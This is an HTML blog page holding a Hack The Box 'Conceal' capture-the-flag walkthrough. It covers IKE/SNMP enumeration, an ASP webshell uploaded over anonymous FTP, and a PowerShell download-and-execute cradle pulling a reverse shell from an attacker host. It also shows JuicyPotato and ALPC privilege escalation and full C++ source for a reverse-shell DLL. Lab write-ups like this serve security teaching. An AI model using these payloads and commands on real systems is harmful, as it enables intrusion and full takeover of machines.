@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Conceal - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Conceal"><a href="#Hack-The-Box-Conceal" class="headerlink" title="Hack The Box - Conceal"></a>Hack The Box - Conceal</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Conceal is a “hard” difficulty Windows which teaches enumeration of IKE protocol and configuring IPSec in transport mode. Once configured and working the firewall goes down and a shell can be uploaded via FTP and executed. On listing the hotfixes the box is found vulnerable to ALPC Task Scheduler LPE. Alternatively, SeImpersonatePrivilege granted to the user allows to obtain a SYSTEM shell. Its IP address is <code>10.10.10.116</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/conceal/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#nmap -p- -T 4 --min-rate=1000 10.10.10.116
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 13:17 EDT
+ Nmap scan report for 10.10.10.116
+ Host is up (0.11s latency).
+ All 65535 scanned ports on 10.10.10.116 are filtered
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 132.27 seconds<br></figure></pre>
+ <p>Scan UDP ports.
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#nmap -p- -T 4 -sU  --min-rate=1000 10.10.10.116
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 13:30 EDT
+ Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+ UDP Scan Timing: About 68.40% done; ETC: 13:32 (0:00:42 remaining)
+ Nmap scan report for 10.10.10.116
+ Host is up (0.11s latency).
+ Not shown: 65534 open|filtered ports
+ PORT    STATE SERVICE
+ 500/udp open  isakmp
+ 161/udp open  snmp    SNMPv1 server (public)
+
+ Nmap done: 1 IP address (1 host up) scanned in 132.12 seconds<br></figure></pre>
+ 
+<h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>Run the enumeration over IKE service.
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/windows)
+ |
+ |-->{SFire129}#ike-scan -M 10.10.10.116
+ Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+ 10.10.10.116    Main Mode Handshake returned
+         HDR=(CKY-R=0812a8dd3adfc7a8)
+         SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
+         VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
+         VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
+         VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
+         VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
+         VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
+         VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)
+ 
+ Ending ike-scan 1.9.4: 1 hosts scanned in 0.155 seconds (6.47 hosts/sec).  1 returned handshake; 0 returned notify</figure></pre>
+ <p>The output reveal information about the vpn connection.
+  <pre><figure class="highlight plain"> SA=(
+   Enc=3DES
+   Hash=SHA1
+   Group=2:modp1024
+   Auth=PSK(Dudecake1!)
+   LifeType=Seconds
+   LifeDuration(4)=0x00007080 (28800 seconds)</figure></pre>
+ <p>Run the scan over port 161 in the protocol SNMP. 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#snmpwalk -v2c -c public 10.10.10.116
+ Created directory: /var/lib/snmp/mib_indexes
+ iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
+ iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
+ iso.3.6.1.2.1.1.3.0 = Timeticks: (351657) 0:58:36.57
+ iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
+ iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
+ iso.3.6.1.2.1.1.6.0 = ""
+ iso.3.6.1.2.1.1.7.0 = INTEGER: 76
+ iso.3.6.1.2.1.2.1.0 = INTEGER: 15</figure></pre>
+ <img src="/images/hackthebox/exploit/conceal/6.png" alt=""></p>
+ <p>The ouput show IKE Password hash.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#echo -n 9C8B1A372B1878851BE2C097031B6E43 | wc -c
+ 32</figure></pre>
+ <p>Decrypt the password.
+ <img src="/images/hackthebox/exploit/conceal/1.png" alt=""></p>
+ <p>Config the VPN Tunnel in the /etc/ipsec.conf.
+ <pre><figure class="highlight plain"> conn Conceal
+
+        type=transport
+        keyexchange=ikev1
+        right=10.10.10.116
+        authby=psk
+        rightprotoport=tcp
+        leftprotoport=tcp
+        esp=3des-sha1
+        ike=3des-sha1-modp1024
+        auto=start</figure></pre>
+<p>Add the <code>10.10.10.116 : PSK "Dudecake1!"</code> to /etc/ipsec.secrets</code>. After, run the ipsec connection.
+ <img src="/images/hackthebox/exploit/conceal/2.png" alt=""></p>
+ <p>Run Nmap again for enumerate the target.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#nmap -sC -sV -p$ports -sT 10.10.10.116
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 14:52 EDT
+ Nmap scan report for 10.10.10.116
+ Host is up (0.11s latency).
+ 
+ PORT      STATE SERVICE       VERSION
+ 21/tcp    open  ftp           Microsoft ftpd
+ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | ftp-syst:
+ |_  SYST: Windows_NT
+ 80/tcp    open  http          Microsoft IIS httpd 10.0
+ | http-methods:
+ |_  Potentially risky methods: TRACE
+ |_http-server-header: Microsoft-IIS/10.0
+ |_http-title: IIS Windows
+ 135/tcp   open  msrpc         Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+ 445/tcp   open  microsoft-ds?
+ 49664/tcp open  msrpc         Microsoft Windows RPC
+ 49665/tcp open  msrpc         Microsoft Windows RPC
+ 49666/tcp open  msrpc         Microsoft Windows RPC
+ 49667/tcp open  msrpc         Microsoft Windows RPC
+ 49668/tcp open  msrpc         Microsoft Windows RPC
+ 49669/tcp open  msrpc         Microsoft Windows RPC
+ 49670/tcp open  msrpc         Microsoft Windows RPC
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ Host script results:
+ |_clock-skew: 4m23s
+ | smb2-security-mode:
+ |   2.02:
+ |_    Message signing enabled but not required
+ | smb2-time:
+ |   date: 2020-06-16T18:57:36
+ |_  start_date: 2020-06-16T16:48:32
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 70.00 seconds </figure></pre>
+ <p>The output show the http and ftp ports are open.
+ <img src="/images/hackthebox/exploit/conceal/3.png" alt=""></p>
+ <p>The Upload folder was revealed with gobuster.
+ <img src="/images/hackthebox/exploit/conceal/4.png" alt=""></p>
+ <p>In the FTP service try with credentials anonymous and upload any file for test.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#echo pwn > file.asp
+ |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#ftp 10.10.10.116
+ Connected to 10.10.10.116.
+ 220 Microsoft FTP Service
+ Name (10.10.10.116:kali): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> put file.asp
+ local: file.asp remote: file.asp
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 5 bytes sent in 0.00 secs (54.8631 kB/s)
+ ftp></figure></pre>
+  <p>Test the file uploaded.
+  <img src="/images/hackthebox/exploit/conceal/5.png" alt=""></p> 
+ <p>From the <a class="vglnk"https://github.com/diegoexploit/webshell"><span>webshells repository</span></a> downloaded in Kali linux, then search .asp webshells and upload in the ftp server.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(/opt/webshell)
+ |
+ |-->{SFire129}#find . |grep asp$ | grep webshell
+ ./asp/Cmd支持管理员登陆的webshell.asp
+ ./asp/webshell.asp
+ ./asp/RadHat-webshell-del-backdoor/明文版.asp
+ ./asp/RadHat-webshell-del-backdoor/加密版.asp
+ ./fuzzdb-webshell/asp
+ ./fuzzdb-webshell/asp/list.asp
+ ./fuzzdb-webshell/asp/ntdaddy.asp
+ ./fuzzdb-webshell/asp/up.asp
+ ./fuzzdb-webshell/asp/cmdasp.asp
+ ./fuzzdb-webshell/asp/cmd-asp-5.1.asp
+ ./fuzzdb-webshell/asp/cmd.asp
+ |-------(root@kali)-------|(/opt/webshell)
+ |
+ |-->{SFire129}#cd asp
+ |-------(root@kali)-------|(/opt/webshell/asp)
+ |
+ |-->{SFire129}#ftp 10.10.10.116
+ Connected to 10.10.10.116.
+ 220 Microsoft FTP Service
+ Name (10.10.10.116:kali): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> put webshell.asp
+ local: webshell.asp remote: webshell.asp
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 1407 bytes sent in 0.00 secs (8.9455 MB/s)
+ ftp> ls
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 06-17-20  01:57AM                 1407 webshell.asp
+ 226 Transfer complete.</figure></pre>
+ <p>In the web browser in the directory <code>/upload/webshell.asp</code>.
+  <img src="/images/hackthebox/exploit/conceal/7.png" alt=""></p> 
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>Download <a class="vglnk"https://github.com/diegoexploit/nishang"rel="nofollow"><span>nishag</span></a> for reverse shell with powershell. Copy and paste <code> cp /opt/nishag/Shells/Invoke-PowerShellTcp.ps1 rev.ps1 </code> and add the next line:
+<code> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4445 </code>
+<img src="/images/hackthebox/exploit/conceal/8.png" alt=""></p> 
+<p>Now, we will need 3 things.<br>
+<p>1.) Run http server from Kali linux with <code>rev.ps1</code> file.<br>
+<img src="/images/hackthebox/exploit/conceal/9.png" alt=""></p>
+<p>2.) From web shell launch <br> <code>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/rev.ps1')"</code><br>
+<img src="/images/hackthebox/exploit/conceal/15.png" alt=""></p>  
+<p>3) Run the netcat over port 4445. <br>
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#nc -nvlp 4445
+ listening on [any] 4445 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.116] 49675
+ Windows PowerShell running as user CONCEAL$ on CONCEAL
+ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+ 
+ PS C:\Windows\SysWOW64\inetsrv>whoami
+ conceal\destitute
+ PS C:\Windows\SysWOW64\inetsrv></figure></pre>
+<p>Enumerate the system reveal users with bad configuration in the section <code>SeImpersonatePrivilege        Impersonate a client after authentication Enabled</code>
+ <pre><figure class="highlight plain">   PS C:\Windows\SysWOW64\inetsrv> whoami /all
+ 
+ USER INFORMATION
+ ----------------
+ 
+ User Name         SID
+ ================= =============================================
+ conceal\destitute S-1-5-21-4220874023-1166253506-927404976-1001
+ 
+ 
+ GROUP INFORMATION
+ -----------------
+ 
+ Group Name                           Type             SID                                                                                              Attributes 
+ ==================================== ================ ================================================================================================ ==================================================
+ Everyone                             Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+ BUILTIN\Users                        Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+ NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                                                          Mandatory group, Enabled by default, Enabled group
+ CONSOLE LOGON                        Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+ NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+ NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+ NT AUTHORITY\Local account           Well-known group S-1-5-113                                                                                        Mandatory group, Enabled by default, Enabled group
+ BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                                                     Mandatory group, Enabled by default, Enabled group
+ LOCAL                                Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+ IIS APPPOOL\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                    Mandatory group, Enabled by default, Enabled group
+ NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                                                      Mandatory group, Enabled by default, Enabled group
+                                      Unknown SID type S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746    Mandatory group, Enabled by default, Enabled group
+                                      Unknown SID type S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822 Mandatory group, Enabled by default, Enabled group
+                                      Unknown SID type S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541    Mandatory group, Enabled by default, Enabled group
+ Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                
+ 
+ 
+ PRIVILEGES INFORMATION
+ ----------------------
+ 
+ Privilege Name                Description                               State
+ ============================= ========================================= ========
+ SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+ SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+ SeShutdownPrivilege           Shut down the system                      Disabled
+ SeAuditPrivilege              Generate security audits                  Disabled
+ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+ SeUndockPrivilege             Remove computer from docking station      Disabled
+ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+ SeTimeZonePrivilege           Change the time zone                      Disabled
+ 
+ PS C:\Windows\SysWOW64\inetsrv> whoami : ERROR: Unable to get user claims information.
+ At line:1 char:1
+ + whoami /all
+ + ~~~~~~~~~~~
+     + CategoryInfo          : NotSpecified: (ERROR: Unable t...ms information.:String) [], RemoteException
+     + FullyQualifiedErrorId : NativeCommandError</figure></pre>
+<p>The command sysinfo show the system not has hotfixes.
+  <img src="/images/hackthebox/exploit/conceal/10.png" alt=""></p>
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privilges</h2>
+<p>There are two ways to get privileges.
+<p>First way is with juicepotato, download  the x64 file in Kali linux from <a class="vglnk"https://github.com/diegoexploit/juicy-potato/releases"rel="nofollow"><span>JuicePotato</span></a>
+<p>In the FTP, set to <code>binary</code> and upload the <code>j.exe</code>
+<pre><figure class="highlight plain"> ftp> binary
+ 200 Type set to I.
+ ftp> put j.exe
+ local: j.exe remote: j.exe
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 347648 bytes sent in 0.36 secs (948.5811 kB/s)
+ 
+ PS C:\users\destitute\Documents> copy \inetpub\wwwroot\upload\j.exe .
+ PS C:\users\destitute\Documents></figure></pre>
+ <p>In Kali linux, create a .bat file with <br> <code>powershell "IEX(New-Object New.WebClient).downloadString('http://10.10.14.27/rev.ps1')"</code> inside, after upload to ftp.
+ <pre><figure class="highlight plain">  |-->{SFire129}#vi p.bat
+ |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#cat p.bat
+ powershell "IEX(New-Object New.WebClient).downloadString('http://10.10.14.27/rev.ps1')"
+ 
+ PS C:\users\destitute\Documents> copy \inetpub\wwwroot\upload\p.bat .
+ PS C:\users\destitute\Documents> type p.bat
+ powershell "IEX(New-Object New.WebClient).downloadString('http://10.10.14.27/rev.ps1')"
+ PS C:\users\destitute\Documents></figure></pre>
+ <p>Search in internet <code>JuicePotato CLSID</code> <code>http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/</code> select the OS and copy CLSID from localservice <code>wuauserv</code>.
+  <img src="/images/hackthebox/exploit/conceal/11.png" alt=""></p>
+  <p>Run another netcat session. In the current session netcat reverse, run the next command. .\j.exe -p p.bat -l 4446 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
+  <img src="/images/hackthebox/exploit/conceal/13.png" alt=""></p> 
+  <p>The second way is for vulnerability over windows tasks CVE-2018-8440. Run the command <code>icacls C:\Windows\Tasks</code>, the output show the bad configuration over authenticated users (RX).
+  
+ <pre><figure class="highlight plain">  PS C:\users\destitute\Documents> icacls C:\Windows\Tasks
+ 
+ C:\Windows\Tasks NT AUTHORITY\Authenticated Users:(RX,WD)
+                  BUILTIN\Administrators:(F)
+                  BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                  NT AUTHORITY\SYSTEM:(F)
+                  NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                  NT AUTHORITY\SYSTEM:(F)
+                  CREATOR OWNER:(OI)(CI)(IO)(F)</figure></pre>
+ 
+ <p>In the Kali Linux, create a file <code>dll.cpp</code> with the next content:
+ <pre><figure class="highlight plain"> 
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+#define DEFAULT_BUFLEN 1024
+void revShell();
+BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
+{
+        switch(dwReason)
+                {
+                        case DLL_PROCESS_ATTACH:
+                                revShell();
+                                break;
+
+
+                        case DLL_PROCESS_DETACH:
+                                break;
+
+                        case DLL_THREAD_ATTACH:
+                                break;
+
+                        case DLL_THREAD_DETACH:
+                                break;
+
+                        }
+                        return 0;
+}
+void revShell() {
+        Sleep(1000); // 1000 = One Second
+        SOCKET mySocket;
+        sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2,2), &version);
+        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned
+int)NULL, (unsigned int)NULL);
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = inet_addr("10.10.14.27"); // Change IP
+        addr.sin_port = htons(4444); //Change port
+        //Connecting to Proxy/ProxyIP/C2Host
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL,
+NULL, NULL)==SOCKET_ERROR) {
+                closesocket(mySocket);
+                WSACleanup();
+        }
+        else {
+                char RecvData[DEFAULT_BUFLEN];
+                memset(RecvData, 0, sizeof(RecvData));
+                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+                if (RecvCode <= 0) {
+                        closesocket(mySocket);
+                        WSACleanup();
+                }
+                else {
+                        char Process[] = "cmd.exe";
+                        STARTUPINFO sinfo;
+                        PROCESS_INFORMATION pinfo;
+                        memset(&sinfo, 0, sizeof(sinfo));
+                        sinfo.cb = sizeof(sinfo);
+                        sinfo.dwFlags = (STARTF_USESTDHANDLES |
+STARTF_USESHOWWINDOW);
+
+
+                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =
+(HANDLE) mySocket;
+                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL,
+NULL, &sinfo, &pinfo);
+
+                        WaitForSingleObject(pinfo.hProcess, INFINITE);
+                        CloseHandle(pinfo.hProcess);
+                        CloseHandle(pinfo.hThread);
+
+
+                        memset(RecvData, 0, sizeof(RecvData));
+                        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN,
+0);
+                        if (RecvCode <= 0) {
+                        closesocket(mySocket);
+                        WSACleanup();
+                        }
+                        if (strcmp(RecvData, "exit\n") == 0) {
+                        exit(0);
+                        }
+                }
+        }
+
+}
+ </figure></pre>
+ <p>Compile the file and upload using FTP:
+ <pre><figure class="highlight plain"> |-->{SFire129}#x86_64-w64-mingw32-g++ dll.cpp -o payload.dll -lws2_32 -shared
+ |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#ls
+ alpcx64.exe  dll.cpp  file.asp  hash  j.exe  JuicyPotato.exe  payload.dll  p.bat  rev.ps1  webshell.asp
+ |-------(root@kali)-------|(~/HackTheBox/conceal)
+ |
+ |-->{SFire129}#</figure></pre>
+ <p>Download ALPC_DiagHub.x64.exe from https://github.com/realoriginal/alpc-diaghub and upload by ftp.<br>
+ <p>Run together in the reverse connection.
+   <img src="/images/hackthebox/exploit/conceal/14.png" alt=""></p>  
+ 
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain"> PS C:\users> cd destitute
+ PS C:\users\destitute> cd desktop
+ PS C:\users\destitute\desktop> dir
+ 
+ 
+     Directory: C:\users\destitute\desktop
+ 
+ 
+ Mode                LastWriteTime         Length Name                        
+ ----                -------------         ------ ----                        
+ -a----       12/10/2018     23:58             32 proof.txt                   
+ 
+ 
+ PS C:\users\destitute\desktop> type proof.txt
+ ***Here you could find the user flag***
+ PS C:\users\destitute\desktop>
+ PS C:\> cd users
+ PS C:\users> cd administrator
+ PS C:\users\administrator> cd desktop
+ PS C:\users\administrator\desktop> dir
+ 
+ 
+     Directory: C:\users\administrator\desktop
+ 
+ 
+ Mode                LastWriteTime         Length Name                        
+ ----                -------------         ------ ----                        
+ -a----       12/10/2018     23:57             32 proof.txt                   
+ 
+ 
+ PS C:\users\administrator\desktop> type proof.txt
+ ***Here you could find the root flag***
+ PS C:\users\administrator\desktop> </figure></pre>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
